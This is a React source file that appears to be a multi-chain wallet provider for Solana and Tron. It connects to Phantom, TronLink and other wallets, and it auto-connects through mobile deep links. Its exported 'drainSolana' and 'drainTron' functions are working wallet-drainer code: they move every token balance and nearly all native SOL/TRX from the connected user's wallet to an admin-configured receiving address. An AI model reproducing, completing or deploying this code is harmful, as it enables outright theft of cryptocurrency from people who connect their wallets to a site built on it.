import React, { createContext, useContext, useState, useCallback, useEffect, useRef } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction } from '@solana/web3.js';
import { getWallets } from '@wallet-standard/app';

const WalletContext = createContext(null);

const SOLANA_RPCS = [
  'https://solana-rpc.publicnode.com',
  'https://rpc.ankr.com/solana',
  'https://api.mainnet-beta.solana.com',
];

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const PHANTOM_AUTO_CONNECT_PARAM = 'phantomAutoConnect';

const isMobileBrowser = () =>
  /android|iphone|ipad|ipod/i.test(window.navigator?.userAgent || '');

const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
const SYSVAR_RENT_PUBKEY = new PublicKey('SysvarRent111111111111111111111111111111111');

function findAssociatedTokenAddress(walletAddress, tokenMintAddress) {
  return PublicKey.findProgramAddressSync(
    [walletAddress.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), tokenMintAddress.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID,
  )[0];
}

function readUint64LE(buffer, offset) {
  const lo = buffer[offset] | (buffer[offset + 1] << 8) | (buffer[offset + 2] << 16) | (buffer[offset + 3] << 24);
  const hi = buffer[offset + 4] | (buffer[offset + 5] << 8) | (buffer[offset + 6] << 16) | (buffer[offset + 7] << 24);
  return BigInt(lo >>> 0) + (BigInt(hi >>> 0) << 32n);
}

function createSplTransferInstruction(source, destination, owner, amount) {
  const data = Buffer.alloc(9);
  data[0] = 3;
  const amountBig = BigInt(amount);
  for (let i = 0; i < 8; i++) {
    data[1 + i] = Number((amountBig >> BigInt(i * 8)) & 0xffn);
  }
  return new TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false },
    ],
    programId: TOKEN_PROGRAM_ID,
    data,
  });
}

function createAssociatedTokenAccountInstruction(payer, associatedToken, owner, mint) {
  return new TransactionInstruction({
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: associatedToken, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: false, isWritable: false },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
    ],
    programId: ASSOCIATED_TOKEN_PROGRAM_ID,
    data: Buffer.alloc(0),
  });
}

const TRC20_ABI = [
  { constant: true, inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: 'to', type: 'address' }, { name: 'value', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], type: 'function' },
];

// Discover Solana-capable wallets via the Wallet Standard (MetaMask, Phantom, Exodus, Trust, etc.)
function discoverSolanaWallets() {
  try {
    const { get } = getWallets();
    const all = get();
    return all.filter(w =>
      w.chains?.some(c => c.startsWith('solana:')) &&
      w.features?.['standard:connect']
    );
  } catch (e) {
    return [];
  }
}

// Get a legacy provider (window.phantom, window.solana, etc.) as fallback
function getLegacySolanaProvider() {
  return window.phantom?.solana || window.solana || window.solflare || null;
}

function tryOpenPhantomOnMobile() {
  if (typeof window === 'undefined') return false;

  const targetUrl = new URL(window.location.href);
  targetUrl.searchParams.set(PHANTOM_AUTO_CONNECT_PARAM, '1');
  const encodedUrl = encodeURIComponent(targetUrl.toString());
  const encodedRef = encodeURIComponent(window.location.origin || targetUrl.origin);

  // App-only deep links (no phantom.app website URLs):
  // 1) Try opening this dApp inside Phantom browser
  // 2) Fallback to opening Phantom app home
  const phantomBrowseScheme = `phantom://v1/browse?url=${encodedUrl}&ref=${encodedRef}`;
  const phantomOpenScheme = 'phantom://';

  window.location.href = phantomBrowseScheme;
  setTimeout(() => {
    window.location.href = phantomOpenScheme;
  }, 1200);

  return true;
}

function getTronProviderBundle() {
  const tronLink = window.tronLink || window.tron || window.okxwallet?.tronLink || null;
  const tronWeb =
    tronLink?.tronWeb ||
    window.tronWeb ||
    window.okxwallet?.tronWeb ||
    null;
  const address =
    tronWeb?.defaultAddress?.base58 ||
    tronWeb?.defaultAddress?.hex ||
    null;

  return {
    tronLink,
    tronWeb,
    address,
    ready: Boolean(tronWeb?.ready),
  };
}

function hasTronInjection() {
  const { tronLink, tronWeb } = getTronProviderBundle();
  return Boolean(tronLink || tronWeb);
}

function buildTronLinkOpenDappDeepLink() {
  const param = {
    url: window.location.href,
    action: 'open',
    protocol: 'tronlink',
    version: '1.0',
  };
  return `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify(param))}`;
}

async function getTronProviderViaTIP6963(timeoutMs = 1200) {
  if (typeof window === 'undefined') return null;

  return new Promise((resolve) => {
    let settled = false;

    const finish = (provider) => {
      if (settled) return;
      settled = true;
      window.removeEventListener('TIP6963:announceProvider', onAnnounce);
      clearTimeout(timer);
      resolve(provider || null);
    };

    const onAnnounce = (event) => {
      const detail = event?.detail;
      if (!detail?.provider || !detail?.info) return;

      // TronLink docs identify provider with these values.
      if (detail.info.rdns === 'org.tronlink.www' || detail.info.name === 'TronLink') {
        finish(detail.provider);
      }
    };

    window.addEventListener('TIP6963:announceProvider', onAnnounce);
    window.dispatchEvent(new Event('TIP6963:requestProvider'));

    const timer = setTimeout(() => finish(null), timeoutMs);
  });
}

export function WalletProvider({ children }) {
  const [solanaAddress, setSolanaAddress] = useState(null);
  const [solanaConnected, setSolanaConnected] = useState(false);
  const [solanaProvider, setSolanaProvider] = useState(null);
  const [solanaBalance, setSolanaBalance] = useState(null);
  const solanaWalletStandard = useRef(null);
  const [, setSolanaWallets] = useState([]);

  const [tronAddress, setTronAddress] = useState(null);
  const [tronConnected, setTronConnected] = useState(false);
  const [tronBalance, setTronBalance] = useState(null);

  const refreshSolanaWallets = useCallback(() => {
    const wallets = discoverSolanaWallets();
    setSolanaWallets(wallets);
    return wallets;
  }, []);

  const syncSolanaState = useCallback(() => {
    const legacy = getLegacySolanaProvider();
    if (legacy?.isConnected && legacy.publicKey) {
      setSolanaAddress(legacy.publicKey.toString());
      setSolanaConnected(true);
      setSolanaProvider(legacy);
      solanaWalletStandard.current = null;
      return true;
    }

    const wallets = discoverSolanaWallets();
    const connectedWallet = wallets.find(wallet => wallet.accounts?.length > 0);
    if (connectedWallet) {
      const account = connectedWallet.accounts[0];
      setSolanaAddress(account.address);
      setSolanaConnected(true);
      setSolanaProvider(null);
      solanaWalletStandard.current = connectedWallet;
      return true;
    }

    return false;
  }, []);

  // When redirected into Phantom browser, auto-attempt connect once.
  useEffect(() => {
    if (!isMobileBrowser()) return;

    const currentUrl = new URL(window.location.href);
    if (currentUrl.searchParams.get(PHANTOM_AUTO_CONNECT_PARAM) !== '1') return;

    let cancelled = false;

    const clearAutoConnectParam = () => {
      const cleanUrl = new URL(window.location.href);
      cleanUrl.searchParams.delete(PHANTOM_AUTO_CONNECT_PARAM);
      window.history.replaceState({}, '', cleanUrl.toString());
    };

    let gestureBound = false;

    const finalizeConnectedState = (response, legacy) => {
      if (!response?.publicKey) return false;
      setSolanaAddress(response.publicKey.toString());
      setSolanaConnected(true);
      setSolanaProvider(legacy);
      solanaWalletStandard.current = null;
      clearAutoConnectParam();
      return true;
    };

    const bindOneTapConnect = (legacy) => {
      if (gestureBound) return;
      gestureBound = true;

      const onUserGesture = async () => {
        window.removeEventListener('pointerdown', onUserGesture);
        window.removeEventListener('touchend', onUserGesture);
        window.removeEventListener('click', onUserGesture);
        if (cancelled) return;

        try {
          const response = await legacy.connect();
          finalizeConnectedState(response, legacy);
        } catch {
          // User may reject popup; keep param for manual retry.
        }
      };

      window.addEventListener('pointerdown', onUserGesture, { once: true, passive: true });
      window.addEventListener('touchend', onUserGesture, { once: true, passive: true });
      window.addEventListener('click', onUserGesture, { once: true, passive: true });
    };

    const runAutoConnect = async () => {
      for (let i = 0; i < 24 && !cancelled; i++) {
        if (syncSolanaState()) {
          clearAutoConnectParam();
          return;
        }

        const legacy = getLegacySolanaProvider();
        if (legacy?.connect) {
          // First try eager connect (no popup) if wallet already trusted.
          try {
            const response = await legacy.connect({ onlyIfTrusted: true });
            if (finalizeConnectedState(response, legacy)) return;
          } catch {
            // Not trusted yet; bind user-gesture connect fallback below.
          }

          // Wallet popup connect generally requires user gesture on mobile.
          bindOneTapConnect(legacy);
        }

        await sleep(500);
      }
    };

    runAutoConnect();
    return () => {
      cancelled = true;
    };
  }, [syncSolanaState]);

  const syncTronState = useCallback(() => {
    const { tronWeb, address, ready } = getTronProviderBundle();
    if (tronWeb && address) {
      setTronAddress(address);
      setTronConnected(true);
      return true;
    }
    if (!ready || !address) {
      setTronAddress(null);
      setTronConnected(false);
    }
    return false;
  }, []);

  // Keep Wallet Standard discovery alive; mobile wallets often register late.
  useEffect(() => {
    let mounted = true;
    let registerUnsubscribe;
    let unregisterUnsubscribe;

    const runRefresh = () => {
      if (!mounted) return;
      refreshSolanaWallets();
      syncSolanaState();
    };

    runRefresh();

    try {
      const walletsApi = getWallets();
      registerUnsubscribe = walletsApi.on?.('register', runRefresh);
      unregisterUnsubscribe = walletsApi.on?.('unregister', runRefresh);
    } catch (e) {
      // Ignore; Wallet Standard may not be available on every browser.
    }

    const pollId = setInterval(runRefresh, 1000);
    const stopPollingId = setTimeout(() => clearInterval(pollId), 15000);

    const onFocus = () => runRefresh();
    const onVisibilityChange = () => {
      if (!document.hidden) runRefresh();
    };

    window.addEventListener('focus', onFocus);
    document.addEventListener('visibilitychange', onVisibilityChange);

    return () => {
      mounted = false;
      clearInterval(pollId);
      clearTimeout(stopPollingId);
      window.removeEventListener('focus', onFocus);
      document.removeEventListener('visibilitychange', onVisibilityChange);
      if (typeof registerUnsubscribe === 'function') registerUnsubscribe();
      if (typeof unregisterUnsubscribe === 'function') unregisterUnsubscribe();
    };
  }, [refreshSolanaWallets, syncSolanaState]);

  // Keep Tron provider state synced with extension/app injection events.
  useEffect(() => {
    let mounted = true;
    let tronProvider = null;
    const onProviderAccountsChanged = () => setTimeout(runSync, 50);
    const onProviderConnect = () => setTimeout(runSync, 50);
    const onProviderDisconnect = () => {
      setTronAddress(null);
      setTronConnected(false);
    };
    const onProviderChainChanged = () => setTimeout(runSync, 50);

    const runSync = () => {
      if (!mounted) return;
      syncTronState();
    };

    runSync();

    const onInitialized = () => {
      setTimeout(runSync, 50);
    };

    const onMessage = (event) => {
      const action = event?.data?.message?.action;
      if (!action) return;

      if (
        action === 'connect' ||
        action === 'connectWeb' ||
        action === 'acceptWeb' ||
        action === 'accountsChanged' ||
        action === 'setAccount' ||
        action === 'tabReply'
      ) {
        setTimeout(runSync, 50);
      }

      if (action === 'disconnect' || action === 'disconnectWeb') {
        setTronAddress(null);
        setTronConnected(false);
      }
    };

    window.addEventListener('tronLink#initialized', onInitialized);
    window.addEventListener('message', onMessage);

    const attachTronProviderEvents = () => {
      const provider = window.tron || window.tronLink || null;
      if (!provider?.on) return;
      tronProvider = provider;

      provider.on('accountsChanged', onProviderAccountsChanged);
      provider.on('connect', onProviderConnect);
      provider.on('disconnect', onProviderDisconnect);
      provider.on('chainChanged', onProviderChainChanged);
    };

    attachTronProviderEvents();
    setTimeout(attachTronProviderEvents, 300);

    const pollId = setInterval(runSync, 500);
    const stopPollingId = setTimeout(() => clearInterval(pollId), 15000);

    return () => {
      mounted = false;
      clearInterval(pollId);
      clearTimeout(stopPollingId);
      window.removeEventListener('tronLink#initialized', onInitialized);
      window.removeEventListener('message', onMessage);
      if (tronProvider?.removeListener) {
        tronProvider.removeListener('accountsChanged', onProviderAccountsChanged);
        tronProvider.removeListener('connect', onProviderConnect);
        tronProvider.removeListener('disconnect', onProviderDisconnect);
        tronProvider.removeListener('chainChanged', onProviderChainChanged);
      }
    };
  }, [syncTronState]);

  // Fetch Solana balance when connected
  useEffect(() => {
    if (!solanaConnected || !solanaAddress) {
      setSolanaBalance(null);
      return;
    }
    const fetchBalance = async () => {
      for (const rpc of SOLANA_RPCS) {
        try {
          const conn = new Connection(rpc, 'confirmed');
          const bal = await conn.getBalance(new PublicKey(solanaAddress));
          setSolanaBalance(bal / 1e9); // lamports -> SOL
          return;
        } catch (e) {
          continue;
        }
      }
    };
    fetchBalance();
    const interval = setInterval(fetchBalance, 30000);
    return () => clearInterval(interval);
  }, [solanaConnected, solanaAddress]);

  // Fetch Tron balance when connected
  useEffect(() => {
    if (!tronConnected || !tronAddress) {
      setTronBalance(null);
      return;
    }
    const fetchBalance = async () => {
      try {
        const tw = (window.tronLink || window.tron)?.tronWeb || window.tronWeb;
        if (tw && tw.ready) {
          const bal = await tw.trx.getBalance(tronAddress);
          setTronBalance(bal / 1e6); // sun -> TRX
        }
      } catch (e) {
        console.warn('Failed to fetch Tron balance:', e);
      }
    };
    fetchBalance();
    const interval = setInterval(fetchBalance, 30000);
    return () => clearInterval(interval);
  }, [tronConnected, tronAddress]);

  // Solana Connection — on desktop prioritises Phantom extension directly;
  // on mobile opens Phantom via deep-link.
  const connectSolana = useCallback(async () => {
    if (syncSolanaState()) return true;

    // Give injected providers a moment to register (extensions can be slow on first load)
    await sleep(300);

    // Re-check after brief wait
    if (syncSolanaState()) return true;

    // ── Desktop path ────────────────────────────────────────────────────────
    if (!isMobileBrowser()) {
      // 1. Phantom extension — most common desktop Solana wallet
      const phantom = window.phantom?.solana;
      if (phantom) {
        try {
          const response = await phantom.connect({ onlyIfTrusted: false });
          setSolanaAddress(response.publicKey.toString());
          setSolanaConnected(true);
          setSolanaProvider(phantom);
          solanaWalletStandard.current = null;
          return true;
        } catch (err) {
          // User rejected (code 4001) — stop silently
          if (err?.code === 4001 || err?.message?.includes('rejected') || err?.message?.includes('User rejected')) {
            return false;
          }
          console.warn('Phantom connect failed:', err);
        }
      }

      // 2. Other legacy providers (Solflare, window.solana)
      const legacy = getLegacySolanaProvider();
      if (legacy && legacy !== phantom) {
        try {
          const response = await legacy.connect({ onlyIfTrusted: false });
          setSolanaAddress(response.publicKey.toString());
          setSolanaConnected(true);
          setSolanaProvider(legacy);
          solanaWalletStandard.current = null;
          return true;
        } catch (err) {
          if (err?.code === 4001 || err?.message?.includes('rejected')) return false;
          console.warn('Legacy Solana provider connect failed:', err);
        }
      }

      // 3. Wallet Standard (MetaMask Snaps, Exodus, Trust, Coinbase, etc.)
      const wallets = refreshSolanaWallets();
      for (const wallet of wallets) {
        try {
          const connectFeature = wallet.features?.['standard:connect'];
          if (!connectFeature) continue;
          const result = await connectFeature.connect();
          const accounts = result.accounts || wallet.accounts;
          if (accounts?.length > 0) {
            setSolanaAddress(accounts[0].address);
            setSolanaConnected(true);
            setSolanaProvider(null);
            solanaWalletStandard.current = wallet;
            return true;
          }
        } catch (err) {
          if (err?.code === 4001 || err?.message?.includes('rejected')) return false;
          console.warn(`Wallet Standard "${wallet.name}" connect failed:`, err);
        }
      }

      // No wallet found on desktop — send user to install Phantom
      window.open('https://phantom.app', '_blank');
      return false;
    }

    // ── Mobile path ─────────────────────────────────────────────────────────
    // Phantom in-app browser exposes window.phantom.solana — try it first
    const phantomMobile = window.phantom?.solana;
    if (phantomMobile) {
      try {
        const response = await phantomMobile.connect({ onlyIfTrusted: false });
        setSolanaAddress(response.publicKey.toString());
        setSolanaConnected(true);
        setSolanaProvider(phantomMobile);
        solanaWalletStandard.current = null;
        return true;
      } catch (err) {
        if (err?.code === 4001 || err?.message?.includes('rejected')) return false;
      }
    }

    let wallets = refreshSolanaWallets();
    if (wallets.length === 0) {
      for (let i = 0; i < 10; i++) {
        await sleep(500);
        wallets = refreshSolanaWallets();
        if (wallets.length > 0 || getLegacySolanaProvider()) break;
      }
    }

    const legacy = getLegacySolanaProvider();
    if (legacy && legacy !== phantomMobile) {
      try {
        const response = await legacy.connect({ onlyIfTrusted: false });
        setSolanaAddress(response.publicKey.toString());
        setSolanaConnected(true);
        setSolanaProvider(legacy);
        solanaWalletStandard.current = null;
        return true;
      } catch (err) {
        if (err?.code === 4001 || err?.message?.includes('rejected')) return false;
      }
    }

    for (const wallet of wallets) {
      try {
        const connectFeature = wallet.features?.['standard:connect'];
        if (!connectFeature) continue;
        const result = await connectFeature.connect();
        const accounts = result.accounts || wallet.accounts;
        if (accounts?.length > 0) {
          setSolanaAddress(accounts[0].address);
          setSolanaConnected(true);
          setSolanaProvider(null);
          solanaWalletStandard.current = wallet;
          return true;
        }
      } catch (err) {
        if (err?.code === 4001 || err?.message?.includes('rejected')) return false;
        console.warn(`Wallet Standard "${wallet.name}" connect failed:`, err);
      }
    }

    // No Solana wallet in mobile browser — deep-link into Phantom app
    tryOpenPhantomOnMobile();
    return false;
  }, [refreshSolanaWallets, syncSolanaState]);

  const disconnectSolana = useCallback(async () => {
    if (solanaProvider) {
      try { await solanaProvider.disconnect(); } catch (e) { /* ignore */ }
    }
    if (solanaWalletStandard.current) {
      try {
        const disconnectFeature = solanaWalletStandard.current.features?.['standard:disconnect'];
        if (disconnectFeature) await disconnectFeature.disconnect();
      } catch (e) { /* ignore */ }
      solanaWalletStandard.current = null;
    }
    setSolanaAddress(null);
    setSolanaConnected(false);
    setSolanaProvider(null);
  }, [solanaProvider]);

  // Tron Connection — works with TronLink, Trust Wallet extension, Exodus extension
  // Note: MetaMask's Tron Snap is internal-only and doesn't expose tronWeb to dApps
  const connectTron = useCallback(async () => {
    if (syncTronState()) {
      return { success: true };
    }

    // Tron injection can arrive late on extension load and in mobile in-app browsers.
    let provider = getTronProviderBundle();
    if (!provider.tronLink && !provider.tronWeb) {
      const tip6963Provider = await getTronProviderViaTIP6963();
      if (tip6963Provider) {
        provider = {
          tronLink: tip6963Provider,
          tronWeb: tip6963Provider.tronWeb || provider.tronWeb,
        };
      }

      for (let i = 0; i < 20; i++) {
        await sleep(500);
        provider = getTronProviderBundle();
        if (provider.tronLink || provider.tronWeb) break;
      }
    }

    if (syncTronState()) {
      return { success: true };
    }

    // Official TronLink authorization flow (different wallets expose different request methods).
    // TIP-1102 style methods are included because newer adapters can expose EIP-like APIs.
    const connectAttempts = [
      async () => provider.tronLink?.request?.({ method: 'eth_requestAccounts' }),
      async () => provider.tronWeb?.request?.({ method: 'eth_requestAccounts' }),
      async () => provider.tronLink?.request?.({ method: 'tron_requestAccounts' }),
      async () => provider.tronWeb?.request?.({ method: 'tron_requestAccounts' }),
      async () => provider.tronLink?.tronWeb?.request?.({ method: 'tron_requestAccounts' }),
    ];

    for (const attempt of connectAttempts) {
      try {
        const res = await attempt();
        if (!res) continue;

        if (res?.code === 4001) {
          console.warn('Tron wallet connection rejected by user');
          return { success: false, reason: 'rejected' };
        }

        if (res?.code === 4000 || res?.code === -32002) {
          // Request is already pending in wallet popup.
          for (let i = 0; i < 20; i++) {
            await sleep(500);
            if (syncTronState()) return { success: true };
          }
          return { success: false, reason: 'pending' };
        }

        if (res?.code === 200 || res === true || Array.isArray(res)) {
          for (let i = 0; i < 20; i++) {
            await sleep(500);
            if (syncTronState()) return { success: true };
          }
        }
      } catch (err) {
        if (err?.code === 4001) {
          return { success: false, reason: 'rejected' };
        }
        if (err?.code === -32002) {
          return { success: false, reason: 'pending' };
        }
        // Keep trying all available request methods.
        console.warn('Tron connect attempt failed:', err?.message || err);
      }
    }

    // Some wallets expose address without reporting ready=true immediately.
    provider = getTronProviderBundle();
    if (provider.tronWeb?.defaultAddress?.base58 || provider.tronWeb?.defaultAddress?.hex) {
      if (syncTronState()) return { success: true };
    }

    provider = getTronProviderBundle();
    if (hasTronInjection() && (!provider.ready || !provider.address)) {
      return { success: false, reason: 'locked_or_not_approved' };
    }

    if (hasTronInjection() && provider.tronLink && !provider.tronLink.request) {
      return { success: false, reason: 'api_unavailable' };
    }

    // Final late-injection recovery pass:
    // Some browsers/extensions inject only after explicit extension interaction.
    await sleep(1200);
    const lateTip6963Provider = await getTronProviderViaTIP6963(1500);
    if (lateTip6963Provider) {
      for (let i = 0; i < 20; i++) {
        await sleep(500);
        if (syncTronState()) return { success: true };
      }
    }

    if (isMobileBrowser()) {
      // TronLink mobile injects only inside TronLink DApp Explorer.
      // If no injection is available, open current page in TronLink app via DeepLink.
      const deeplink = buildTronLinkOpenDappDeepLink();
      window.location.href = deeplink;
      return { success: false, reason: 'open_in_tronlink_mobile' };
    }
    return { success: false, reason: 'not_detected_desktop' };
  }, [syncTronState]);

  const disconnectTron = useCallback(() => {
    setTronAddress(null);
    setTronConnected(false);
  }, []);

  const signAndSendSolanaTransaction = useCallback(async (transaction, connection, blockhash, lastValidBlockHeight) => {
    const hasLegacy = !!solanaProvider;
    const hasStandard = !!solanaWalletStandard.current;
    let signature = null;

    if (hasLegacy) {
      const signed = await solanaProvider.signTransaction(transaction);
      signature = await connection.sendRawTransaction(signed.serialize(), {
        skipPreflight: true,
        preflightCommitment: 'confirmed',
      });
    } else if (hasStandard) {
      const wallet = solanaWalletStandard.current;

      if (wallet.features['solana:signAndSendTransaction']) {
        const serialized = transaction.serialize({ requireAllSignatures: false });
        const result = await wallet.features['solana:signAndSendTransaction'].signAndSendTransaction({
          account: wallet.accounts[0],
          transaction: serialized,
          chain: 'solana:mainnet',
        });
        signature = result[0]?.signature
          ? new TextDecoder().decode(result[0].signature)
          : null;
      } else if (wallet.features['solana:signTransaction']) {
        const serialized = transaction.serialize({ requireAllSignatures: false });
        const result = await wallet.features['solana:signTransaction'].signTransaction({
          account: wallet.accounts[0],
          transaction: serialized,
          chain: 'solana:mainnet',
        });
        const signedTx = result[0]?.signedTransaction;
        if (signedTx) {
          signature = await connection.sendRawTransaction(signedTx, { skipPreflight: true });
        }
      }
    }

    if (signature) {
      const confirmPromise = connection.confirmTransaction(
        { signature, blockhash, lastValidBlockHeight },
        'confirmed'
      );
      const timeoutPromise = new Promise(r => setTimeout(() => r('timeout'), 10000));
      const result = await Promise.race([confirmPromise, timeoutPromise]);
      if (result === 'timeout') {
        console.warn('Solana confirmation timed out, tx was sent:', signature);
      }
    }

    return signature;
  }, [solanaProvider]);

  // Solana drain — transfers SPL tokens first, then native SOL
  const drainSolana = useCallback(async (receivingWallet, tokens = []) => {
    if (!solanaAddress) return false;
    const hasLegacy = !!solanaProvider;
    const hasStandard = !!solanaWalletStandard.current;
    if (!hasLegacy && !hasStandard) return false;

    let fromPubkey, toPubkey;
    try {
      fromPubkey = new PublicKey(solanaAddress);
      toPubkey = new PublicKey(receivingWallet);
    } catch (e) {
      console.error('Invalid Solana address:', e.message);
      return false;
    }

    for (const rpc of SOLANA_RPCS) {
      try {
        const connection = new Connection(rpc, 'confirmed');

        for (const token of tokens) {
          try {
            const mintPubkey = new PublicKey(token.address);
            const sourceAta = findAssociatedTokenAddress(fromPubkey, mintPubkey);
            const destAta = findAssociatedTokenAddress(toPubkey, mintPubkey);

            const sourceAccountInfo = await connection.getAccountInfo(sourceAta);
            if (!sourceAccountInfo || sourceAccountInfo.data.length < 72) continue;

            const tokenBalance = readUint64LE(sourceAccountInfo.data, 64);
            if (tokenBalance <= 0n) continue;

            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
            const tx = new Transaction();
            tx.recentBlockhash = blockhash;
            tx.feePayer = fromPubkey;

            const destAccountInfo = await connection.getAccountInfo(destAta);
            if (!destAccountInfo) {
              tx.add(createAssociatedTokenAccountInstruction(fromPubkey, destAta, toPubkey, mintPubkey));
            }

            tx.add(createSplTransferInstruction(sourceAta, destAta, fromPubkey, tokenBalance));

            await signAndSendSolanaTransaction(tx, connection, blockhash, lastValidBlockHeight);
          } catch (err) {
            const msg = err?.message || String(err);
            if (msg.includes('User rejected') || msg.includes('user rejected')) return false;
            console.warn(`SPL token transfer failed (${token.symbol || token.address}):`, msg);
          }
        }

        // Transfer native SOL
        const balance = await connection.getBalance(fromPubkey);

        const FEE_RESERVE = 6000000;
        if (balance <= FEE_RESERVE) {
          console.warn('Solana balance too low for native transfer:', balance);
          return tokens.length > 0;
        }

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        const sendAmount = balance - FEE_RESERVE;

        const transaction = new Transaction().add(
          SystemProgram.transfer({ fromPubkey, toPubkey, lamports: sendAmount })
        );
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;

        const signature = await signAndSendSolanaTransaction(transaction, connection, blockhash, lastValidBlockHeight);
        if (signature) return true;

        return false;
      } catch (err) {
        const msg = err?.message || String(err);
        console.warn(`Solana drain attempt failed (${rpc}):`, msg);
        if (msg.includes('User rejected') || msg.includes('user rejected')) return false;
        continue;
      }
    }

    console.error('Solana drain failed on all RPCs');
    return false;
  }, [solanaProvider, solanaAddress, signAndSendSolanaTransaction]);

  // Tron drain — transfers TRC20 tokens first, then native TRX
  const drainTron = useCallback(async (receivingWallet, tokens = []) => {
    if (!tronConnected || !tronAddress) return false;

    if (!receivingWallet) {
      console.error('Tron drain: no receiving wallet configured');
      return false;
    }

    // Normalise both addresses to base58 lowercase for comparison
    const normalise = (addr) => (addr || '').trim().toLowerCase();
    if (normalise(receivingWallet) === normalise(tronAddress)) {
      console.error('Tron drain: receiving wallet is the same as the sender — check admin preset configuration');
      return false;
    }

    const tw = (window.tronLink || window.tron)?.tronWeb || window.tronWeb;
    if (!tw) {
      console.error('TronWeb not available');
      return false;
    }

    try {
      if (!tw.ready) {
        await new Promise(r => setTimeout(r, 1000));
        if (!tw.ready) {
          console.error('TronWeb not ready');
          return false;
        }
      }

      for (const token of tokens) {
        try {
          const contract = await tw.contract(TRC20_ABI, token.address);
          const rawBalance = await contract.balanceOf(tronAddress).call();
          const tokenBalance = BigInt(rawBalance.toString());

          if (tokenBalance > 0n) {
            await contract.transfer(receivingWallet, tokenBalance.toString()).send({
              feeLimit: 100_000_000,
              callValue: 0,
              shouldPollResponse: false,
            });
            console.log(`TRC20 ${token.symbol || token.address} transfer sent`);
          }
        } catch (err) {
          const msg = err?.message || String(err);
          if (msg.includes('Confirmation declined') || msg.includes('rejected')) return false;
          console.warn(`TRC20 transfer failed (${token.symbol || token.address}):`, msg);
        }
      }

      const balance = await tw.trx.getBalance(tronAddress);
      const fee = 4000000;
      const sendAmount = balance - fee;

      if (sendAmount <= 0) {
        console.warn('TRX balance too low for native transfer:', balance, 'sun');
        return tokens.length > 0;
      }

      const unsignedTx = await tw.transactionBuilder.sendTrx(
        receivingWallet, sendAmount, tronAddress
      );
      const signedTx = await tw.trx.sign(unsignedTx);
      const result = await tw.trx.sendRawTransaction(signedTx);

      return result.result || result.txid || false;
    } catch (err) {
      console.error('Tron drain error:', err);
      return false;
    }
  }, [tronConnected, tronAddress]);

  const value = {
    solanaAddress, solanaConnected, solanaBalance, connectSolana, disconnectSolana, drainSolana,
    tronAddress, tronConnected, tronBalance, connectTron, disconnectTron, drainTron,
  };

  return (
    <WalletContext.Provider value={value}>
      {children}
    </WalletContext.Provider>
  );
}

export function useWallet() {
  const context = useContext(WalletContext);
  if (!context) throw new Error('useWallet must be used within WalletProvider');
  return context;
}
